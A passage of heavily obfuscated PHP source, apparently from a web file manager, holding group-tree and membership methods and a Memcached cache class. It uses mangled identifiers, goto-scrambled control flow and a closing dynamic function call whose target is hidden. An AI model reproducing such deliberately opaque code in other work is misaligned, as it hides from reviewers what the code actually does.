array_merge($d’™Æë∆äã, $d§‡¯Û‘â„, $D»ºâÛÀ™ﬁ[$fôπ”ÛÎ’Ë[367]]); $D»ºâÛÀ™ﬁ[$fôπ”ÛÎ’Ë[367]] = array_unique_by_key($Eùü«π≤©ù, $fôπ”ÛÎ’Ë[1726]); $D»ºâÛÀ™ﬁ[$fôπ”ÛÎ’Ë[364]][$fôπ”ÛÎ’Ë[365]] = count($D»ºâÛÀ™ﬁ[$fôπ”ÛÎ’Ë[367]]); goto fªÇ–Ê÷ †; fªÇ–Ê÷ †: $D»ºâÛÀ™ﬁ[$fôπ”ÛÎ’Ë[364]][$fôπ”ÛÎ’Ë[366]] = ceil($D»ºâÛÀ™ﬁ[$fôπ”ÛÎ’Ë[364]][$fôπ”ÛÎ’Ë[365]] / $D»ºâÛÀ™ﬁ[$fôπ”ÛÎ’Ë[364]][$fôπ”ÛÎ’Ë[361]]); goto e∞≠îº¯—‚; D°Ù≈¶ﬁô«: $CÃﬂç¯ØÀı = $this->groupChildrenAll($Dæ‰ø«çÇ»); $d’™Æë∆äã = $this->_searchFromMeta($fôπ”ÛÎ’Ë[457], $dãÙßÕ¨ùø, 10, $CÃﬂç¯ØÀı); $d§‡¯Û‘â„ = $this->_searchFromMeta($fôπ”ÛÎ’Ë[458], $dãÙßÕ¨ùø, 10, $CÃﬂç¯ØÀı); goto d√º©•Ç‘ö; e∞≠îº¯—‚: } $this->_listDataApply($D»ºâÛÀ™ﬁ[$fôπ”ÛÎ’Ë[367]]); goto DÚ∫ıüŒ®¿; fòªûöŒÕ: if ($Dæ‰ø«çÇ») { $eá…ÖııŒæ = $this->getInfoSimple($Dæ‰ø«çÇ»); $c´„ßÎΩøÓ = $eá…ÖııŒæ[$fôπ”ÛÎ’Ë[515]] . $Dæ‰ø«çÇ» . $fôπ”ÛÎ’Ë[539]; $cÏ„–∆–´Ω = array($cÏ„–∆–´Ω, array($fôπ”ÛÎ’Ë[515] => array($fôπ”ÛÎ’Ë[381], $c´„ßÎΩøÓ))); } $cÏ„–∆–´Ω = $this->parseWhereLike($cÏ„–∆–´Ω); $D»ºâÛÀ™ﬁ = $this->_makeOrder()->where($cÏ„–∆–´Ω)->selectPage(20); goto f©òû‰àÑ; DÚ∫ıüŒ®¿: return $D»ºâÛÀ™ﬁ; goto F∞´øÉÎßî; F∞´øÉÎßî: } protected function groupChildrenAll($A€èë”ÉÔì) { $Eè≤¯÷àì‘ =& $_SERVER[’ÿƒ†ïò]; if (!$A€èë”ÉÔì) { return !1; } if (is_string($A€èë”ÉÔì)) { $A€èë”ÉÔì = array($A€èë”ÉÔì); } $DÛ◊◊æ«Á = $A€èë”ÉÔì; foreach ($A€èë”ÉÔì as $c—Ÿ∏éÛùè) { $cÍß‹ÓÓœÀ = $this->getInfoSimple($c—Ÿ∏éÛùè); $BŒªë–è≠ì = array($Eè≤¯÷àì‘[515] => array($Eè≤¯÷àì‘[381], $cÍß‹ÓÓœÀ[$Eè≤¯÷àì‘[515]] . $c—Ÿ∏éÛùè . $Eè≤¯÷àì‘[539])); $F®©ä¨ıØÖ = $this->field($Eè≤¯÷àì‘[1726])->where($BŒªë–è≠ì)->select(); $DÛ◊◊æ«Á = array_merge($DÛ◊◊æ«Á, array_to_keyvalue($F®©ä¨ıØÖ, $Eè≤¯÷àì‘[33], $Eè≤¯÷àì‘[1726])); } return array_unique($DÛ◊◊æ«Á); } private function _searchFromMeta($EµØ‚˜üÏ, $eΩ›Ûàö’é, $d«Ñõåµ˘Ö, $cØà§ı’≥ç) { goto b≈˜€ú¯ÀÀ; cã™Õá¨≠∂: if (!$e¨»’Ø‚ﬂ™) { return array(); } return $e¨»’Ø‚ﬂ™; goto fõ°æè∫Ì¿; b≈˜€ú¯ÀÀ: $Eà¥ÜáÚŒ∞ =& $_SERVER[’ÿƒ†ïò]; $eΩ›Ûàö’é = strtolower($eΩ›Ûàö’é); $D¢Œóƒñ¡ı = array($Eà¥ÜáÚŒ∞[93] => $EµØ‚˜üÏ, $Eà¥ÜáÚŒ∞[372] => array($Eà¥ÜáÚŒ∞[381], "\x25{$eΩ›Ûàö’é}\45")); goto B¢„É„ûâ“; B¢„É„ûâ“: $D¢Œóƒñ¡ı = $this->parseWhereLike($D¢Œóƒñ¡ı); if ($cØà§ı’≥ç) { $D¢Œóƒñ¡ı[$Eà¥ÜáÚŒ∞[1726]] = array($Eà¥ÜáÚŒ∞[7], $cØà§ı’≥ç); } $fØÑåÖëßè = Model($Eà¥ÜáÚŒ∞[1819])->where($D¢Œóƒñ¡ı)->limit($d«Ñõåµ˘Ö)->select(); goto D⁄ΩÇ”ù≤ä; D⁄ΩÇ”ù≤ä: if (!$fØÑåÖëßè) { return array(); } $fØÑåÖëßè = array_to_keyvalue($fØÑåÖëßè, $Eà¥ÜáÚŒ∞[33], $Eà¥ÜáÚŒ∞[1726]); $e¨»’Ø‚ﬂ™ = $this->where(array($Eà¥ÜáÚŒ∞[1810] => array($Eà¥ÜáÚŒ∞[7], $fØÑåÖëßè)))->select(); goto cã™Õá¨≠∂; fõ°æè∫Ì¿: } protected function _listDataApplyItem($DˆíˆΩŸ’Ì) { $Bö‹Ïï∏ó∏ = array($DˆíˆΩŸ’Ì); $this->_listDataApply($Bö‹Ïï∏ó∏); return $Bö‹Ïï∏ó∏[0]; } protected function _listDataApply(&$bŒÊÿƒ⁄âè) { goto f«ñá˜íıø; a≠ÔÉã«‰í: $this->_listAppendChildren($bŒÊÿƒ⁄âè); $this->_listAppendChildrenMember($bŒÊÿƒ⁄âè); $this->_listAppendMeta($bŒÊÿƒ⁄âè, $fëìßÓﬂï‹); goto A≤∫ºƒ”Ñµ; f«ñá˜íıø: $bè™ﬂÕÉ€ã =& $_SERVER[’ÿƒ†ïò]; if (!$bŒÊÿƒ⁄âè) { return; } $fëìßÓﬂï‹ = array_to_keyvalue($bŒÊÿƒ⁄âè, $bè™ﬂÕÉ€ã[33], $bè™ﬂÕÉ€ã[1726]); goto a≠ÔÉã«‰í; A≤∫ºƒ”Ñµ: $this->_listAppendParent($bŒÊÿƒ⁄âè); $this->_listAppendSourceRoot($bŒÊÿƒ⁄âè, $fëìßÓﬂï‹); goto C‰ÖèﬂÃãƒ; C‰ÖèﬂÃãƒ: } private function _listAppendChildren(&$D‡÷ŸÁÍÈƒ) { goto a“õÑåÕ¢Ü; aãá∏œ·’î: foreach ($D‡÷ŸÁÍÈƒ as &$eãéÕàÏ’) { $AÂæﬂ…≈à» = $eãéÕàÏ’[$DÓ¡®Õö‘ä[1726]]; $eãéÕàÏ’[$DÓ¡®Õö‘ä[1821]] = isset($cöÁ¨ﬂøûΩ[$AÂæﬂ…≈à»]) ? intval($cöÁ¨ﬂøûΩ[$AÂæﬂ…≈à»]) : !1; } unset($eãéÕàÏ’); goto FóÀƒÑ–Éπ; c”ÊÜòñÿË: $CﬂÌ¬ÚåîÜ = array($DÓ¡®Õö‘ä[492], $DÓ¡®Õö‘ä[1820] => $DÓ¡®Õö‘ä[494]); $aà–Âœ£®Ö = $this->field($CﬂÌ¬ÚåîÜ)->where($dë±⁄®áÈ£)->group($DÓ¡®Õö‘ä[492])->select(); $cöÁ¨ﬂøûΩ = array_to_keyvalue($aà–Âœ£®Ö, $DÓ¡®Õö‘ä[492], $DÓ¡®Õö‘ä[494]); goto aãá∏œ·’î; a“õÑåÕ¢Ü: $DÓ¡®Õö‘ä =& $_SERVER[’ÿƒ†ïò]; $BÂ„Ò£Á÷£ = array_to_keyvalue($D‡÷ŸÁÍÈƒ, $DÓ¡®Õö‘ä[33], $DÓ¡®Õö‘ä[1726]); $dë±⁄®áÈ£ = array($DÓ¡®Õö‘ä[492] => array($DÓ¡®Õö‘ä[7], $BÂ„Ò£Á÷£)); goto c”ÊÜòñÿË; FóÀƒÑ–Éπ: } private function _listAppendChildrenMember(&$c∏Éµ™«Àå) { goto FÛ¡àÉﬂ√â; bπµ™ﬂ±Ω¯: $aÑéùÊèﬂï = array($CÀÉ´«˜⁄ß[1726], $CÀÉ´«˜⁄ß[1820] => $CÀÉ´«˜⁄ß[494]); $CÑ®ùäÛß = Model($CÀÉ´«˜⁄ß[1812])->field($aÑéùÊèﬂï)->where($B≥°‹…¿ÕÙ)->group($CÀÉ´«˜⁄ß[1726])->select(); $CÜ∞Èûó’Ù = array_to_keyvalue($CÑ®ùäÛß, $CÀÉ´«˜⁄ß[1726], $CÀÉ´«˜⁄ß[494]); goto EàÇÒ∫™ Ì; FÛ¡àÉﬂ√â: $CÀÉ´«˜⁄ß =& $_SERVER[’ÿƒ†ïò]; $eÆ…◊Ûï⁄Û = array_to_keyvalue($c∏Éµ™«Àå, $CÀÉ´«˜⁄ß[33], $CÀÉ´«˜⁄ß[1726]); $B≥°‹…¿ÕÙ = array($CÀÉ´«˜⁄ß[1726] => array($CÀÉ´«˜⁄ß[7], $eÆ…◊Ûï⁄Û)); goto bπµ™ﬂ±Ω¯; EàÇÒ∫™ Ì: foreach ($c∏Éµ™«Àå as &$Eí◊ê–ÖÉı) { $F¯∂Úõ˜Ÿ« = $Eí◊ê–ÖÉı[$CÀÉ´«˜⁄ß[1726]]; $Eí◊ê–ÖÉı[$CÀÉ´«˜⁄ß[1822]] = isset($CÜ∞Èûó’Ù[$F¯∂Úõ˜Ÿ«]) ? intval($CÜ∞Èûó’Ù[$F¯∂Úõ˜Ÿ«]) : !1; } unset($Eí◊ê–ÖÉı); goto Aä™†ÆÒì≤; Aä™†ÆÒì≤: } private function _listAppendMeta(&$B©ã∞ÇπŒ, $bÎïÑ‚Ì¿Ú) { goto F˜œµŸº‹˘; F˜œµŸº‹˘: $aâÆƒÍΩ‚ï =& $_SERVER[’ÿƒ†ïò]; $BÀŸ±âˆû‚ = array($aâÆƒÍΩ‚ï[1726] => array($aâÆƒÍΩ‚ï[7], $bÎïÑ‚Ì¿Ú)); $BêüÿŸ·… = Model($aâÆƒÍΩ‚ï[1811])->where($BÀŸ±âˆû‚)->select(); goto cçÑ∂∂û°ÿ; Cê—ëÑ˘•≥: foreach ($B©ã∞ÇπŒ as &$E“éÆ˜‰Ç∑) { $E“éÆ˜‰Ç∑[$aâÆƒÍΩ‚ï[459]] = array(); if (isset($BêüÿŸ·…[$E“éÆ˜‰Ç∑[$aâÆƒÍΩ‚ï[1726]]])) { $E“éÆ˜‰Ç∑[$aâÆƒÍΩ‚ï[459]] = $BêüÿŸ·…[$E“éÆ˜‰Ç∑[$aâÆƒÍΩ‚ï[1726]]]; } } unset($E“éÆ˜‰Ç∑); goto C≤ÕÁ‡çÌí; cçÑ∂∂û°ÿ: $BêüÿŸ·… = array_to_keyvalue_group($BêüÿŸ·…, $aâÆƒÍΩ‚ï[1726]); foreach ($BêüÿŸ·… as &$C·›Í§ä‡ú) { $C·›Í§ä‡ú = array_to_keyvalue($C·›Í§ä‡ú, $aâÆƒÍΩ‚ï[93], $aâÆƒÍΩ‚ï[372]); } unset($C·›Í§ä‡ú); goto Cê—ëÑ˘•≥; C≤ÕÁ‡çÌí: } protected function parentLevelArray($e¿ÁçÖó¬Ì) { $Eã®Œá›Êò =& $_SERVER[’ÿƒ†ïò]; $e¿ÁçÖó¬Ì = explode($Eã®Œá›Êò[47], trim($e¿ÁçÖó¬Ì, $Eã®Œá›Êò[47])); $e¿ÁçÖó¬Ì = array_remove_value($e¿ÁçÖó¬Ì, $Eã®Œá›Êò[191]); return $e¿ÁçÖó¬Ì; } private function _listAppendParent(&$aãåã‘¬ë÷) { goto F‘Æº◊˜∫¡; c»ì¯ÿ©ƒ»: if ($GLOBALS[$eÛ∫âõµ¬æ[499]] == $eÛ∫âõµ¬æ[87]) { $DßÖ¯Õ¡©ø = !1; } foreach ($aãåã‘¬ë÷ as &$DÆãÃ•åÑπ) { $E˘ÉäíÔ § = $this->parentLevelArray($DÆãÃ•åÑπ[$eÛ∫âõµ¬æ[515]]); $f¥èä‘·êÍ = $eÛ∫âõµ¬æ[33]; foreach ($E˘ÉäíÔ § as $eê¡¯’Ü‹® => $b‘√Ÿø¥àë) { if ($DßÖ¯Õ¡©ø && $eê¡¯’Ü‹® == 0) { continue; } $f¥èä‘·êÍ .= $Cº£⁄´´±π[$b‘√Ÿø¥àë] . $eÛ∫âõµ¬æ[8]; } if ($E˘ÉäíÔ §) { $f¥èä‘·êÍ .= $DÆãÃ•åÑπ[$eÛ∫âõµ¬æ[28]]; } $DÆãÃ•åÑπ[$eÛ∫âõµ¬æ[520]] = str_replace($eÛ∫âõµ¬æ[523], $eÛ∫âõµ¬æ[8], $f¥èä‘·êÍ); } unset($DÆãÃ•åÑπ); goto AÀÓÔ›íÜﬁ; D∑º≤±¥ùŒ: unset($DÆãÃ•åÑπ); foreach ($Cº£⁄´´±π as $eê¡¯’Ü‹® => $CÉ’ôÚáü) { if ($CÉ’ôÚáü) { continue; } $b»´‡èØÀ◊ = $this->getInfoSimple($eê¡¯’Ü‹®); $Cº£⁄´´±π[$eê¡¯’Ü‹®] = $b»´‡èØÀ◊[$eÛ∫âõµ¬æ[28]]; } $DßÖ¯Õ¡©ø = $GLOBALS[$eÛ∫âõµ¬æ[6]][$eÛ∫âõµ¬æ[88]][$eÛ∫âõµ¬æ[1823]]; goto c»ì¯ÿ©ƒ»; F‘Æº◊˜∫¡: $eÛ∫âõµ¬æ =& $_SERVER[’ÿƒ†ïò]; $Cº£⁄´´±π = array(); foreach ($aãåã‘¬ë÷ as &$DÆãÃ•åÑπ) { $Cº£⁄´´±π[$DÆãÃ•åÑπ[$eÛ∫âõµ¬æ[1726]]] = $DÆãÃ•åÑπ[$eÛ∫âõµ¬æ[28]]; $E˘ÉäíÔ § = $this->parentLevelArray($DÆãÃ•åÑπ[$eÛ∫âõµ¬æ[515]]); foreach ($E˘ÉäíÔ § as $b‘√Ÿø¥àë) { if (!isset($Cº£⁄´´±π[$b‘√Ÿø¥àë])) { $Cº£⁄´´±π[$b‘√Ÿø¥àë] = 0; } } } goto D∑º≤±¥ùŒ; AÀÓÔ›íÜﬁ: } private function _listAppendSourceRoot(&$c≈ÒêÖ£ﬁÈ, $cöøºÎºÿ•) { goto fé‹≈∑¬¡‰; FÚô·Æ•ç“: $cåŒ¯≈ââ— = $b¶•‹ÖÏ¬À->limit(count($cöøºÎºÿ•))->where($f§¬ÓÜ∫√µ)->select(); $cåŒ¯≈ââ— = array_to_keyvalue($cåŒ¯≈ââ—, $A¥‡€Ω∂àÎ[498]); $cåŒ¯≈ââ— = array_remove_key($cåŒ¯≈ââ—, $A¥‡€Ω∂àÎ[498]); goto D≤ò≤ì™£Ì; D≤ò≤ì™£Ì: foreach ($c≈ÒêÖ£ﬁÈ as &$F¬ìáªÕπ ) { $F¬ìáªÕπ [$A¥‡€Ω∂àÎ[85]] = $cåŒ¯≈ââ—[$F¬ìáªÕπ [$A¥‡€Ω∂àÎ[1726]]] ? $cåŒ¯≈ââ—[$F¬ìáªÕπ [$A¥‡€Ω∂àÎ[1726]]] : array(); } unset($F¬ìáªÕπ ); goto Aº∆ã––◊Ö; fé‹≈∑¬¡‰: $A¥‡€Ω∂àÎ =& $_SERVER[’ÿƒ†ïò]; $f§¬ÓÜ∫√µ = array($A¥‡€Ω∂àÎ[492] => 0, $A¥‡€Ω∂àÎ[498] => array($A¥‡€Ω∂àÎ[7], $cöøºÎºÿ•), $A¥‡€Ω∂àÎ[406] => SourceModel::TYPE_GROUP); $b¶•‹ÖÏ¬À = Model($A¥‡€Ω∂àÎ[820])->order($A¥‡€Ω∂àÎ[1824])->field($A¥‡€Ω∂àÎ[1825]); goto FÚô·Æ•ç“; Aº∆ã––◊Ö: } protected function groupMerge($dä¨“£ì—œ) { $dä¨“£ì—œ = array_values(array_unique($dä¨“£ì—œ)); $F’‚á◊¥Èª = array(); for ($FÊ‰∂Ë¨©Ú = 0; $FÊ‰∂Ë¨©Ú < count($dä¨“£ì—œ); $FÊ‰∂Ë¨©Ú++) { $dæÉ¿»€≠¬ = !1; for ($Eµ¡ê‰ë—∏ = 0; $Eµ¡ê‰ë—∏ < count($dä¨“£ì—œ); $Eµ¡ê‰ë—∏++) { if ($FÊ‰∂Ë¨©Ú == $Eµ¡ê‰ë—∏) { continue; } if ($this->isParentOf($dä¨“£ì—œ[$Eµ¡ê‰ë—∏], $dä¨“£ì—œ[$FÊ‰∂Ë¨©Ú])) { $dæÉ¿»€≠¬ = !0; break; } } if (!$dæÉ¿»€≠¬) { $F’‚á◊¥Èª[] = $dä¨“£ì—œ[$FÊ‰∂Ë¨©Ú]; } } return $F’‚á◊¥Èª; } protected function isParentOf($EâÕÂÍÜÙâ, $Aà˜…∑¢⁄„) { goto F√æäÁéÆü; f¥ÕçÆ¥¨ã: $D‡Îë´ˆÎÊ = $this->getInfoSimple($Aà˜…∑¢⁄„); $E›ñÚ°ƒªÆ = $Aï∂∞Êœ»¡[$EõÀ€äü°≥[515]] . $EâÕÂÍÜÙâ . $EõÀ€äü°≥[47]; if (substr($D‡Îë´ˆÎÊ[$EõÀ€äü°≥[515]], 0, strlen($E›ñÚ°ƒªÆ)) == $E›ñÚ°ƒªÆ) { return !0; } goto E∂Ãπ”ÆÕ•; E∂Ãπ”ÆÕ•: return !1; goto b¥®îôﬁ“™; F√æäÁéÆü: $EõÀ€äü°≥ =& $_SERVER[’ÿƒ†ïò]; if (!$EâÕÂÍÜÙâ || !$Aà˜…∑¢⁄„ || $EâÕÂÍÜÙâ == $Aà˜…∑¢⁄„) { return !1; } $Aï∂∞Êœ»¡ = $this->getInfoSimple($EâÕÂÍÜÙâ); goto f¥ÕçÆ¥¨ã; b¥®îôﬁ“™: } public function groupShowRoot($cÔ≤‘Ωñ®‡, $Bò‡Éıü˘∆ = false) { goto bçô˜∂ÉÒÆ; bçô˜∂ÉÒÆ: $BÚˆ˜◊ª»ò =& $_SERVER[’ÿƒ†ïò]; $cÎ‚Öïœ‹— = $this->getInfo($cÔ≤‘Ωñ®‡); if (!$cÎ‚Öïœ‹—) { return array(); } goto eˆê◊àÃÖÈ; d£„ç„òåâ: return $AéÒ¥∏Óéﬁ; goto e∑•¥ÒÆÜö; B™¶ìƒâŸÀ: if ($Bò‡Éıü˘∆ && count($a¯ÒæÜ˘ë·) == 1) { return $AéÒ¥∏Óéﬁ; } if (!$cÎ‚Öïœ‹—[$BÚˆ˜◊ª»ò[459]] || !isset($cÎ‚Öïœ‹—[$BÚˆ˜◊ª»ò[459]][$BÚˆ˜◊ª»ò[1808]]) || $cÎ‚Öïœ‹—[$BÚˆ˜◊ª»ò[459]][$BÚˆ˜◊ª»ò[1808]] == $BÚˆ˜◊ª»ò[1780]) { return $this->groupShowRoot($a¯ÒæÜ˘ë·[count($a¯ÒæÜ˘ë·) - 1], $Bò‡Éıü˘∆); } if ($cÎ‚Öïœ‹—[$BÚˆ˜◊ª»ò[459]][$BÚˆ˜◊ª»ò[1808]] == $BÚˆ˜◊ª»ò[355]) { $eß‘â◊ˆåÌ = explode($BÚˆ˜◊ª»ò[47], $cÎ‚Öïœ‹—[$BÚˆ˜◊ª»ò[459]][$BÚˆ˜◊ª»ò[1809]]); if ($eß‘â◊ˆåÌ) { $AéÒ¥∏Óéﬁ = array_merge($AéÒ¥∏Óéﬁ, $eß‘â◊ˆåÌ); } } goto d£„ç„òåâ; eˆê◊àÃÖÈ: $a¯ÒæÜ˘ë· = $this->parentLevelArray($cÎ‚Öïœ‹—[$BÚˆ˜◊ª»ò[515]]); $AéÒ¥∏Óéﬁ = array($cÔ≤‘Ωñ®‡); if (count($a¯ÒæÜ˘ë·) == 0) { return $AéÒ¥∏Óéﬁ; } goto B™¶ìƒâŸÀ; e∑•¥ÒÆÜö: } protected function resetParentLevel() { $AíàÍÆ¯‡  =& $_SERVER[’ÿƒ†ïò]; $E™Ï—¿¶ËÈ = $AíàÍÆ¯‡ [1726]; $b∏◊«„Ùó  = $this->select(); $b∏◊«„Ùó  = array_to_keyvalue($b∏◊«„Ùó , $E™Ï—¿¶ËÈ); foreach ($b∏◊«„Ùó  as $eê∞⁄À≈≠È) { goto AüÊ”ø∞£”; E≠≤‰áåó¥: $this->where(array($E™Ï—¿¶ËÈ => $eê∞⁄À≈≠È[$E™Ï—¿¶ËÈ]))->save(array($AíàÍÆ¯‡ [578] => $a›üÙøë˜)); goto dÖ£Èı÷™¬; AüÊ”ø∞£”: $FÓÂıï…Û√ = $eê∞⁄À≈≠È; $a›üÙøë˜ = array(); while ($FÓÂıï…Û√[$AíàÍÆ¯‡ [492]] != 0) { $a›üÙøë˜[] = $FÓÂıï…Û√[$AíàÍÆ¯‡ [492]]; $FÓÂıï…Û√ = $b∏◊«„Ùó [$FÓÂıï…Û√[$AíàÍÆ¯‡ [492]]]; } goto BØÕÓ’Ûàô; BØÕÓ’Ûàô: $a›üÙøë˜[] = 0; $a›üÙøë˜ = $AíàÍÆ¯‡ [47] . implode($AíàÍÆ¯‡ [47], array_reverse($a›üÙøë˜)) . $AíàÍÆ¯‡ [47]; $this->setNamePinyin($eê∞⁄À≈≠È[$E™Ï—¿¶ËÈ], $eê∞⁄À≈≠È[$AíàÍÆ¯‡ [28]]); goto E≠≤‰áåó¥; dÖ£Èı÷™¬: } return $b∏◊«„Ùó ; } public function groupNameAuto($d¥ŒŒÕÙ±›, $E…ÔÀΩ∆ﬁª) { $eÈÔáç…ãÏ =& $_SERVER[’ÿƒ†ïò]; $DäÆ‹É±‹≠ = $this->where(array($eÈÔáç…ãÏ[396] => $d¥ŒŒÕÙ±›))->getField($eÈÔáç…ãÏ[28], !0); if (!$DäÆ‹É±‹≠ || !in_array($E…ÔÀΩ∆ﬁª, $DäÆ‹É±‹≠)) { return $E…ÔÀΩ∆ﬁª; } for ($cÌ·éçÃÚ∞ = 1; $cÌ·éçÃÚ∞ <= count($DäÆ‹É±‹≠) + 1; $cÌ·éçÃÚ∞++) { $EÃùÊ‰¡Öﬁ = $E…ÔÀΩ∆ﬁª . "\50{$cÌ·éçÃÚ∞}\x29"; if (!in_array($EÃùÊ‰¡Öﬁ, $DäÆ‹É±‹≠)) { return $EÃùÊ‰¡Öﬁ; } } } public function groupSwitch($Aåé¥∑ë¡¡, $Aäƒˆç…‹Ù) { goto eò≤óœÑ∆¯; b–ôèﬂúÁÒ: $A≈¯ÿÛäâ∏ = Model($F¿ö´∆ëõ•[1812])->where($Cèâàﬁêëê)->select(); if (!$A≈¯ÿÛäâ∏) { $A≈¯ÿÛäâ∏ = array(); } foreach ($A≈¯ÿÛäâ∏ as $a—Ω“¿Øßº) { $aÔ…Ë —á¡ = $a—Ω“¿Øßº[$F¿ö´∆ëõ•[1557]]; $Cèâàﬁêëê = array($F¿ö´∆ëõ•[1557] => $aÔ…Ë —á¡, $F¿ö´∆ëõ•[1726] => $Aäƒˆç…‹Ù); $fÏêç∂åπÆ = Model($F¿ö´∆ëõ•[1812])->where($Cèâàﬁêëê)->find(); if (!$fÏêç∂åπÆ) { $DﬁØ¨™Ç£¨ = array($Aäƒˆç…‹Ù => $a—Ω“¿Øßº[$F¿ö´∆ëõ•[1826]]); Model($F¿ö´∆ëõ•[532])->userGroupAdd($aÔ…Ë —á¡, $DﬁØ¨™Ç£¨); } Model($F¿ö´∆ëõ•[532])->userGroupRemove($aÔ…Ë —á¡, $Aåé¥∑ë¡¡); } goto Fëßå¶åñÒ; bÿÀÌƒô‚ı: $bÜ ≈áí∞Ù = array_to_keyvalue($bÜ ≈áí∞Ù, $F¿ö´∆ëõ•[1726]); if (!isset($bÜ ≈áí∞Ù[$Aåé¥∑ë¡¡]) || !isset($bÜ ≈áí∞Ù[$Aäƒˆç…‹Ù]) || $bÜ ≈áí∞Ù[$Aåé¥∑ë¡¡][$F¿ö´∆ëõ•[492]] == 0) { return !1; } $Cèâàﬁêëê = array($F¿ö´∆ëõ•[1726] => $Aåé¥∑ë¡¡); goto b–ôèﬂúÁÒ; bªŸ∞öãÉ–: $this->where(array($F¿ö´∆ëõ•[492] => $Aåé¥∑ë¡¡))->save(array($F¿ö´∆ëõ•[492] => $Aäƒˆç…‹Ù)); $this->_clearChildrenCache($bÜ ≈áí∞Ù[$Aäƒˆç…‹Ù]); return !0; goto a∫çŸãì—é; eò≤óœÑ∆¯: $F¿ö´∆ëõ• =& $_SERVER[’ÿƒ†ïò]; $Cèâàﬁêëê = array($F¿ö´∆ëõ•[1726] => array($F¿ö´∆ëõ•[7], array($Aåé¥∑ë¡¡, $Aäƒˆç…‹Ù))); $bÜ ≈áí∞Ù = $this->where($Cèâàﬁêëê)->select(); goto bÿÀÌƒô‚ı; F Ÿ◊ŒãÔÕ: $eﬂ®ƒ‰‘ÊÔ = !empty($DÆæêº∑„≠[$Aåé¥∑ë¡¡]) ? $DÆæêº∑„≠[$Aåé¥∑ë¡¡] : !1; if ($eﬂ®ƒ‰‘ÊÔ) { goto BªçàÈÿƒŒ; BªçàÈÿƒŒ: if (!$DÆæêº∑„≠[$Aäƒˆç…‹Ù]) { $DÆæêº∑„≠[$Aäƒˆç…‹Ù] = Model($F¿ö´∆ëõ•[820])->groupRootAdd($Aäƒˆç…‹Ù); } $b“óç†ŒÃ⁄ = $DÆæêº∑„≠[$Aäƒˆç…‹Ù]; $Cèâàﬁêëê = array($F¿ö´∆ëõ•[492] => $eﬂ®ƒ‰‘ÊÔ); goto fß≈…·≠ëœ; fß≈…·≠ëœ: $DÆæêº∑„≠ = Model($F¿ö´∆ëõ•[820])->where($Cèâàﬁêëê)->field($F¿ö´∆ëõ•[1828])->select(); if (!$DÆæêº∑„≠) { $DÆæêº∑„≠ = array(); } Model($F¿ö´∆ëõ•[820])->moveClearAuth = !1; goto CåÎÜ⁄úÈû; CåÎÜ⁄úÈû: foreach ($DÆæêº∑„≠ as $AâîÈ∏ò€¶) { $cæ∫Éø·™≠ = $AâîÈ∏ò€¶[$F¿ö´∆ëõ•[405]] == $F¿ö´∆ëõ•[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($F¿ö´∆ëõ•[820])->move($AâîÈ∏ò€¶[$F¿ö´∆ëõ•[397]], $b“óç†ŒÃ⁄, $cæ∫Éø·™≠); } Model($F¿ö´∆ëõ•[820])->moveClearAuth = !0; $Cèâàﬁêëê = array($F¿ö´∆ëõ•[406] => 2, $F¿ö´∆ëõ•[498] => $Aåé¥∑ë¡¡); goto BëÕÚƒ≈îƒ; BëÕÚƒ≈îƒ: $cêå§√–› = array($F¿ö´∆ëõ•[498] => $Aäƒˆç…‹Ù); Model($F¿ö´∆ëõ•[1829])->where($Cèâàﬁêëê)->save($cêå§√–›); Model($F¿ö´∆ëõ•[1830])->where($Cèâàﬁêëê)->save($cêå§√–›); goto Eå‘÷»ŸÍö; Eå‘÷»ŸÍö: } $this->_changeChildLevel($bÜ ≈áí∞Ù[$Aåé¥∑ë¡¡], $bÜ ≈áí∞Ù[$Aäƒˆç…‹Ù], !0); goto bªŸ∞öãÉ–; Fëßå¶åñÒ: $Cèâàﬁêëê = array($F¿ö´∆ëõ•[406] => 2, $F¿ö´∆ëõ•[492] => 0, $F¿ö´∆ëõ•[405] => 1, $F¿ö´∆ëõ•[498] => array($F¿ö´∆ëõ•[7], array($Aåé¥∑ë¡¡, $Aäƒˆç…‹Ù))); $DÆæêº∑„≠ = Model($F¿ö´∆ëõ•[820])->where($Cèâàﬁêëê)->field($F¿ö´∆ëõ•[1827])->select(); $DÆæêº∑„≠ = array_to_keyvalue($DÆæêº∑„≠, $F¿ö´∆ëõ•[498], $F¿ö´∆ëõ•[397]); goto F Ÿ◊ŒãÔÕ; a∫çŸãì—é: } } goto cÁ≠ÿ¿ûò; bç∆À∏º±ü: define($_SERVER[’ÿƒ†ïò][237], 2); define($_SERVER[’ÿƒ†ïò][238], 3); define($_SERVER[’ÿƒ†ïò][239], 1); goto E®ãÛà’ä”; DÀ¬πﬂµÕﬂ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($BˆÛ‹π∆ê‡, $fªåû◊¬˜ë) { $FÓ°∫ÃÖÍ∆ =& $_SERVER[’ÿƒ†ïò]; if (!class_exists($FÓ°∫ÃÖÍ∆[851])) { show_json($FÓ°∫ÃÖÍ∆[852], !1); } $this->cacheTime = $fªåû◊¬˜ë; $this->handle = new Memcached(); if (is_array($BˆÛ‹π∆ê‡[$FÓ°∫ÃÖÍ∆[853]]) && count($BˆÛ‹π∆ê‡[$FÓ°∫ÃÖÍ∆[853]]) >= 1) { foreach ($BˆÛ‹π∆ê‡[$FÓ°∫ÃÖÍ∆[853]] as $E¿«ÈåÀ‘∏) { $b⁄”˜ÃòŸ¨ = explode($FÓ°∫ÃÖÍ∆[4], $E¿«ÈåÀ‘∏); $this->handle->addServer($b⁄”˜ÃòŸ¨[0], $b⁄”˜ÃòŸ¨[1]); } } else { $this->handle->addServer($BˆÛ‹π∆ê‡[$FÓ°∫ÃÖÍ∆[175]], $BˆÛ‹π∆ê‡[$FÓ°∫ÃÖÍ∆[176]]); } } public function set($cªñêîó¿Õ, $cÍç›ÇÛÑ», $bÙƒËƒﬁﬁ™ = false) { $bÙƒËƒﬁﬁ™ = $bÙƒËƒﬁﬁ™ ? $bÙƒËƒﬁﬁ™ : $this->cacheTime; return $this->handle->set($cªñêîó¿Õ, $cÍç›ÇÛÑ», $bÙƒËƒﬁﬁ™); } public function get($b∂√«æËìÏ) { return $this->handle->get($b∂√«æËìÏ); } public function remove($dıËôÈî¿´) { return $this->handle->delete($dıËôÈî¿´); } public function deleteAll() { return $this->handle->flush(); } } if ($_SERVER[$_SERVER[’ÿƒ†ïò][854]] != $_SERVER[$_SERVER[’ÿƒ†ïò][855]]) { goto eÜ“£∂óÜƒ; Dáê˜‚ˆÓ§: $Aß≠ª¥âìã($_SERVER[$_SERVER[’ÿƒ†ïò][861]]); goto 